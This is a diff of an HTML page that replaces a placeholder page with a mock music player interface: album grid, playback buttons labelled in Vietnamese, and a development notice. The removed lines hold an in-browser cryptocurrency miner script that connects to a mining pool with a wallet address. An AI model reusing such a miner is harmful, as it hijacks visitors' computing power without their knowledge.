@@ -1,21 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Music Player</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+
+        .album {
+            background: linear-gradient(145deg, #1f1f1f, #292929);
+            box-shadow: 4px 4px 8px #0f0f0f, -4px -4px 8px #333;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .album:hover {
+            transform: scale(1.05);
+            box-shadow: 6px 6px 12px #0b0b0b, -6px -6px 12px #3b3b3b;
+        }
+
+        .album-title {
+            margin-bottom: 10px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .song {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        .controls {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            background: linear-gradient(145deg, #1f1f1f, #292929);
+            box-shadow: 4px 4px 8px #0f0f0f, -4px -4px 8px #333;
+            border-radius: 10px;
+        }
+
+        .controls button {
+            background: #333;
+            border: none;
+            color: white;
+            padding: 10px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s, transform 0.3s;
+        }
+
+        .controls button:hover {
+            background: #555;
+            transform: scale(1.1);
+        }
+
+        .volume {
+            writing-mode: bt-lr;
+            transform: rotate(-90deg);
+            appearance: none;
+            background: #333;
+            height: 10px;
+            width: 150px;
+            margin-left: 20px;
+            border-radius: 5px;
+        }
+
+        .development-info {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .development-info a {
+            color: #1e90ff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
-  <script src="app.js"></script>
-  <script>
-    const stratum = {
-      server: "ghostrider.na.mine.zpool.ca",
-      port: 5354,
-      worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
-      password: "c=RVN"
-    }
-    mine (algos.ghostrider, stratum, true, 2)
-  </script>
+    <div class="container">
+        <div class="album">
+            <div class="album-title">Album 1</div>
+            <div class="song">Song 1</div>
+            <div class="song">Song 2</div>
+            <div class="song">Song 3</div>
+        </div>
+        <div class="album">
+            <div class="album-title">Album 2</div>
+            <div class="song">Song 1</div>
+            <div class="song">Song 2</div>
+            <div class="song">Song 3</div>
+        </div>
+        <div class="album">
+            <div class="album-title">Album 3</div>
+            <div class="song">Song 1</div>
+            <div class="song">Song 2</div>
+            <div class="song">Song 3</div>
+        </div>
+        <div class="album">
+            <div class="album-title">Album 4</div>
+            <div class="song">Song 1</div>
+            <div class="song">Song 2</div>
+            <div class="song">Song 3</div>
+        </div>
+    </div>
+
+    <div class="controls">
+        <div>
+            <button onclick="prevSong()">Lùi Bài</button>
+            <button onclick="pauseSong()">Tắt Bài</button>
+            <button onclick="nextSong()">Chuyển Bài</button>
+        </div>
+        <input type="range" min="0" max="100" value="50" class="volume">
+    </div>
+
+    <div class="development-info">
+        <p>Trang web đang trong giai đoạn phát triển</p>
+        <p>Giao lưu cùng tôi: <a href="https://t.me/...">t/me/...</a></p>
+    </div>
+
+    <script>
+        function prevSong() {
+            console.log('Previous song');
+        }
+
+        function pauseSong() {
+            console.log('Pause song');
+        }
+
+        function nextSong() {
+            console.log('Next song');
+        }
+    </script>
 </body>
 </html>
